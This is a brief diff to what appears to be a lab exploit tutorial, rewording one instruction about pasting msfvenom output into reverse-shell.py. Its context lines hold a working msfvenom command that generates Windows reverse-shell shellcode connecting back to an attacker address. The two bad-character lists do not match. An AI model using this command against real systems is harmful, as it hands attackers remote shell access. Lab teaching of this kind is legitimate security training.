@@ -289,7 +289,7 @@ HOST = '10.0.2.7'   # vitcim IP
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0d' 
 ```
 
-Use the output of msfvenom above, and replace the following code in a similar way
+Use the output of msfvenom above, and replace the following code of reverse-shell.py in a similar way
 ```
 # Shellcode created by msfvenom
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
